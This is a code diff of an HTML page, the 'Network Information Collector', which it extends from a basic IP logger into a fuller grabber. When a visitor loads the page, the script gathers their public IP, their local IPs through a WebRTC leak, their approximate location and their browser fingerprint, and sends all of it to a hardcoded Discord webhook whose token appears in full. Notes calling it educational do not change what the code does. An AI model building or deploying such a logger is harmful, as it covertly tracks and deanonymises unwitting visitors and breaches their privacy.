@@ -3,82 +3,332 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Information Tool</title>
+    <title>Network Information Collector</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f0f0f0;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
-            color: #333;
         }
         .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            width: 100%;
             max-width: 600px;
-            margin: 50px auto;
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         h1 {
-            color: #d32f2f;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #4ecdc4;
+            font-size: 28px;
         }
         .status {
+            padding: 15px;
+            border-radius: 8px;
             margin: 20px 0;
-            padding: 10px;
-            border-radius: 4px;
+            text-align: center;
+            font-weight: 500;
         }
         .loading {
-            background-color: #fff9c4;
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid rgba(255, 193, 7, 0.3);
         }
         .success {
-            background-color: #c8e6c9;
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid rgba(46, 204, 113, 0.3);
             display: none;
         }
+        .error {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid rgba(231, 76, 60, 0.3);
+            display: none;
+        }
+        .info-box {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .info-title {
+            font-weight: 600;
+            color: #4ecdc4;
+            margin-bottom: 5px;
+        }
+        .info-value {
+            font-family: monospace;
+            word-break: break-all;
+        }
         .note {
+            text-align: center;
+            margin-top: 25px;
             font-size: 12px;
-            color: #757575;
-            margin-top: 30px;
+            opacity: 0.7;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 10px auto;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #4ecdc4;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Network Information Tool</h1>
+        <h1>Network Information Collector</h1>
+        
         <div id="loadingStatus" class="status loading">
-            Gathering network information...
+            <div class="spinner"></div>
+            <p>Gathering network information...</p>
         </div>
+        
+        <div id="errorStatus" class="status error">
+            <p>Error gathering information. Please check console for details.</p>
+        </div>
+        
         <div id="result" class="status success">
-            <h2>Your IP address has been captured!</h2>
-            <p>This demonstrates how websites can collect your network information.</p>
+            <p>Information successfully gathered and sent!</p>
         </div>
+        
+        <div class="info-box">
+            <div class="info-title">Public IP Address</div>
+            <div id="publicIp" class="info-value">Collecting...</div>
+        </div>
+        
+        <div class="info-box">
+            <div class="info-title">Local IP Address</div>
+            <div id="localIp" class="info-value">Collecting...</div>
+        </div>
+        
+        <div class="info-box">
+            <div class="info-title">Approximate Location</div>
+            <div id="location" class="info-value">Collecting...</div>
+        </div>
+        
+        <div class="info-box">
+            <div class="info-title">Browser Information</div>
+            <div id="browserInfo" class="info-value">Collecting...</div>
+        </div>
+        
         <p class="note">Authorized for educational purposes in a VM environment only.</p>
     </div>
 
     <script>
-        // Function to get IP address
-        async function getIPAddress() {
+        // Webhook URL - Replace with your Discord webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1410748139270574120/1QuSGBHkQE6MdIy5ZGk-wkmdowKjbsXEjkVwB9tMpCEq_bzmxAq2Rwj7xqhrPA4s95Rr';
+        
+        // Function to get public IP address
+        async function getPublicIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                console.error('Error fetching IP:', error);
+                console.error('Error fetching public IP:', error);
                 return 'Unknown';
             }
         }
-
-        // Function to send data to Discord webhook
-        async function sendToDiscordWebhook(ipAddress) {
-            const webhookURL = 'https://discord.com/api/webhooks/1410748139270574120/1QuSGBHkQE6MdIy5ZGk-wkmdowKjbsXEjkVwB9tMpCEq_bzmxAq2Rwj7xqhrPA4s95Rr';
+        
+        // Function to get local IP addresses (using WebRTC)
+        async function getLocalIPs() {
+            return new Promise((resolve) => {
+                const ips = [];
+                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                
+                if (!RTCPeerConnection) {
+                    resolve(['WebRTC not supported']);
+                    return;
+                }
+                
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                
+                // Create a data channel (required to trigger candidate gathering)
+                pc.createDataChannel('');
+                
+                // Generate an SDP offer to trigger candidate gathering
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(error => {
+                        console.error('Error creating offer:', error);
+                        resolve(['Error getting local IP']);
+                    });
+                
+                // Listen for ICE candidates
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                        // End of candidates
+                        if (ips.length === 0) {
+                            ips.push('No local IP found');
+                        }
+                        resolve(ips);
+                        return;
+                    }
+                    
+                    const candidate = ice.candidate.candidate;
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                    const ipMatch = candidate.match(ipRegex);
+                    
+                    if (ipMatch) {
+                        const ip = ipMatch[1];
+                        // Filter out duplicate and non-private IPs
+                        if (!ips.includes(ip) && 
+                            (ip.startsWith('192.168.') || 
+                             ip.startsWith('10.') || 
+                             ip.startsWith('172.16.') || 
+                             ip.startsWith('172.17.') || 
+                             ip.startsWith('172.18.') || 
+                             ip.startsWith('172.19.') || 
+                             ip.startsWith('172.20.') || 
+                             ip.startsWith('172.21.') || 
+                             ip.startsWith('172.22.') || 
+                             ip.startsWith('172.23.') || 
+                             ip.startsWith('172.24.') || 
+                             ip.startsWith('172.25.') || 
+                             ip.startsWith('172.26.') || 
+                             ip.startsWith('172.27.') || 
+                             ip.startsWith('172.28.') || 
+                             ip.startsWith('172.29.') || 
+                             ip.startsWith('172.30.') || 
+                             ip.startsWith('172.31.') || 
+                             ip === '127.0.0.1' || 
+                             ip === '0.0.0.0' || 
+                             ip === 'localhost')) {
+                            ips.push(ip);
+                        }
+                    }
+                };
+                
+                // Timeout if ICE gathering takes too long
+                setTimeout(() => {
+                    if (ips.length === 0) {
+                        ips.push('Local IP detection timed out');
+                    }
+                    resolve(ips);
+                }, 5000);
+            });
+        }
+        
+        // Function to get approximate location based on IP
+        async function getLocationFromIP(ip) {
+            if (ip === 'Unknown' || ip === '127.0.0.1' || ip.startsWith('192.168.') || 
+                ip.startsWith('10.') || ip.startsWith('172.')) {
+                return 'Local network - location not available';
+            }
             
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                
+                if (data.error) {
+                    return 'Location not available';
+                }
+                
+                let location = '';
+                if (data.city) location += `${data.city}, `;
+                if (data.region) location += `${data.region}, `;
+                if (data.country_name) location += data.country_name;
+                if (data.postal) location += `, ${data.postal}`;
+                
+                return location || 'Location not available';
+            } catch (error) {
+                console.error('Error fetching location:', error);
+                return 'Location not available';
+            }
+        }
+        
+        // Function to get browser information
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfEnabled: navigator.pdfViewerEnabled || false,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                colorDepth: `${screen.colorDepth}-bit`,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+            };
+        }
+        
+        // Function to send data to Discord webhook
+        async function sendToDiscordWebhook(publicIP, localIPs, location, browserInfo) {
             const payload = {
-                content: `Network information collected: IP Address - ${ipAddress}`
+                content: null,
+                embeds: [
+                    {
+                        title: "Network Information Collected",
+                        description: "A user's network information was collected",
+                        color: 5814783, // Discord purple
+                        fields: [
+                            {
+                                name: "Public IP Address",
+                                value: publicIP,
+                                inline: true
+                            },
+                            {
+                                name: "Local IP Addresses",
+                                value: localIPs.join(', ') || 'Not available',
+                                inline: true
+                            },
+                            {
+                                name: "Approximate Location",
+                                value: location,
+                                inline: true
+                            },
+                            {
+                                name: "User Agent",
+                                value: browserInfo.userAgent.substring(0, 100) + (browserInfo.userAgent.length > 100 ? '...' : ''),
+                                inline: false
+                            },
+                            {
+                                name: "Platform & Language",
+                                value: `${browserInfo.platform} / ${browserInfo.language}`,
+                                inline: true
+                            },
+                            {
+                                name: "Screen & Viewport",
+                                value: `${browserInfo.screen} / ${browserInfo.viewport}`,
+                                inline: true
+                            },
+                            {
+                                name: "Timezone",
+                                value: browserInfo.timezone,
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: "Educational Use - White Hat Research"
+                        },
+                        timestamp: new Date().toISOString()
+                    }
+                ]
             };
             
             try {
-                const response = await fetch(webhookURL, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -92,31 +342,55 @@
                 return false;
             }
         }
-
+        
         // Main function
         async function init() {
             try {
-                // Get IP address
-                const ipAddress = await getIPAddress();
+                // Update UI
+                document.getElementById('publicIp').textContent = 'Fetching...';
+                document.getElementById('localIp').textContent = 'Fetching...';
+                document.getElementById('location').textContent = 'Fetching...';
+                document.getElementById('browserInfo').textContent = 'Fetching...';
+                
+                // Get public IP
+                const publicIP = await getPublicIP();
+                document.getElementById('publicIp').textContent = publicIP;
+                
+                // Get local IPs
+                const localIPs = await getLocalIPs();
+                document.getElementById('localIp').textContent = localIPs.join(', ') || 'Not available';
+                
+                // Get location
+                const location = await getLocationFromIP(publicIP);
+                document.getElementById('location').textContent = location;
+                
+                // Get browser info
+                const browserInfo = getBrowserInfo();
+                document.getElementById('browserInfo').textContent = 
+                    `${browserInfo.platform} / ${browserInfo.language} / ${browserInfo.screen}`;
                 
                 // Send to Discord webhook
-                const success = await sendToDiscordWebhook(ipAddress);
+                const success = await sendToDiscordWebhook(publicIP, localIPs, location, browserInfo);
                 
                 // Update UI
                 if (success) {
                     document.getElementById('loadingStatus').style.display = 'none';
                     document.getElementById('result').style.display = 'block';
                 } else {
-                    document.getElementById('loadingStatus').textContent = 
-                        'Error sending information. Please check console for details.';
+                    document.getElementById('loadingStatus').style.display = 'none';
+                    document.getElementById('errorStatus').style.display = 'block';
+                    document.getElementById('errorStatus').textContent = 
+                        'Information gathered but failed to send. Check console for details.';
                 }
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('loadingStatus').textContent = 
+                document.getElementById('loadingStatus').style.display = 'none';
+                document.getElementById('errorStatus').style.display = 'block';
+                document.getElementById('errorStatus').textContent = 
                     'An error occurred. Please check console for details.';
             }
         }
-
+        
         // Start the process when the page loads
         window.onload = init;
     </script>
